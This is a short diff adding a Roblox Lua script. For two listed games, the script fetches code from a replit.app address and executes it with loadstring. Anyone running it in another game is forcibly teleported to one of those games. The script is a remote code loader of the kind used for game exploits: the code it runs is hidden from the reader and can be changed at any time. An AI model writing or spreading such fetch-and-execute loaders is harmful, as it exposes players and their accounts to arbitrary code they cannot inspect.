@@ -1,0 +1,14 @@
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local GAMES = {
+    [1233534628] = "https://junk-code-security--seyxn.replit.app/raw/8xzjgpcwc6ytqr598f78zf",
+    [3101667897] = "https://junk-code-security--seyxn.replit.app/raw/56d3nfhdt5ynntzxrprzfd"
+}
+
+if GAMES[game.PlaceId] then
+    loadstring(game:HttpGet(GAMES[game.PlaceId]))()
+else
+    TeleportService:Teleport(3101667897, player)
+end
